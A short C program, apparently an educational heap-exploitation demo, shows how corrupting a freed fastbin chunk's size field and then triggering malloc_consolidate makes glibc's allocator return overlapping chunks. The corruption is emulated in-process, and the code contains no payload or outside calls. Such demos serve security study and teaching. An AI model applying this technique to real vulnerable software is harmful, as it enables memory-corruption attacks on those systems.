#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;

int main() {
    malloc(1);

    void *m1 = malloc(0x20);
    void *m2 = malloc(0x100);
    // allocate another chunk to avoid the top-handling special casing
    void *m3 = malloc(0x100);

    mchunkptr p1 = (mchunkptr)((char*)m1 - offsetof(struct malloc_chunk, fd));
    printf("allocated fastbin-sized (0x%zx) chunk p1: %p\n", p1->size, (void*)m1);
    mchunkptr p2 = (mchunkptr)((char*)m2 - offsetof(struct malloc_chunk, fd));
    printf("allocated small (0x%zx) chunk p2: %p\n", p2->size, (void*)m2);

    printf("freeing p1\n");
    free(m1);

    printf("emulating corruption of p1\n");
    p1->size += p2->size & ~PREV_INUSE;

    printf("triggering malloc_consolidate via allocation for large chunk\n");
    malloc(0x400);
    printf("after consolidation malloc(0x%x) returns %p\n", 0x100, malloc(0x100));

    return 0;
}
